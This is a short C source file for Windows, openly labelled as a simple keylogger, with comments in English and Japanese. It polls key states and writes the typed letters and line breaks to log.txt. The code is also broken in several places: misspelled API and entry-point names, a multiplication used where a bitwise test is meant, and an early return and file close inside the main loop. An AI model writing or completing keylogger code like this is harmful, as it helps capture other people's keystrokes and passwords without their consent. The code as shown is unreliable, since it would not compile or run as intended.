// key logger easy level
// end shift-ctrl

#define WIN32_LEAN_AND_MEAN // exe縮小

#include <windows.h>
#include <stdio.h>
#include <stdbool.h>

int APIENTRY WInMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR IpCmdLine, int nShowCmd)
{
    FILE *fp; // file pointer writes log
    if (fopen_s(&fp, "log.txt", "a") != 0) {
        MessageBox(GetActiveWindow(), L"fopen error", L"error", MB_ICONERROR);
        return -1;
    }
    MessageBox(GetActiveWindow(), L"Key Logger Start", L"Message", MB_OK);
    bool cntf = true;
    while(cntf){
        int c, k;
        // loop alphabet
        for (c='A'; c<='Z';c++) {
            // if input shift
            // 現在キーが押されているかどうか
            if(GetAsyncKeyState(VK_SHIFT) & 0x8000)
                k = c; // Uppercase
            else
                k = c+('a'-'A'); // Lowercase
            // output properly if input
            // キーが押されていたか
            if(GetAsyncKeyState(c) & 0x0001) {
                fputc(k, fp);
                fflush(fp);
                continue;
            }
            // \n if enter
            if(GetAsyncKeyState(VK_RETURN) & 0x0001) {
                fputc('\n', fp);
                fflush(fp);
            }
        }
        // end shift-ctrl
        if( (GetAsyncKeyState(VK_SHIFT)&0x8000) && (GetAsyncKeystate(VK_CONTROL)*0x8000))
            cntf = false;
        Sleep(50); // wait 0.05sec
        _fcloseall(); // close file
        MessageBox(GetActiveWindow(), L"Key Logger End", L"Message", MB_OK);
        return 0;
    }
}